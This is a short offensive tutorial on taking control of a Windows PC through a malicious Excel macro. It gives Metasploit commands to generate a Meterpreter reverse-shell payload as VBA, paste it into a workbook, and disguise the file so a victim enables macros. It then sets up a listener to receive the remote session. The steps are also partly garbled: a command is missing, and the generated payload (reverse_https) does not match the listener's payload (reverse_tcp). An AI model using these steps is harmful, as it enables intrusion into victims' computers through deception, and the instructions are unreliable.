Hack Remote Windows PC using Macros with Msfvenom

Open metasploit framework by typing the command: and type
use windows/meterpreter/reverse_https
msf exploit (reverse_https)>set lhost 192.168.0.104 (IP of Local Host)
msf exploit (reverse_https)>set lport 443
msf exploit (reverse_https)>generate –t vba

The command generates -t vba means to generate a raw code in text formal in language visual basic.
Copy the code that comes in terminal.
Now open windows->New Microsoft Office Excel Worksheet->view (on the top bar) ->macro 
Enter the macro name->create

Now select: ‘This Workbook’ and paste the vba code generated before and save the file as a new name and edit the document so as to make it look authentic and user should definitely enable the macros option.


Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.104
set lport 443
exploit
 Now, wait for the victim to open the document and enable the macros option. As soon as he clicks on the enable macros option we will get a meterpreter session.
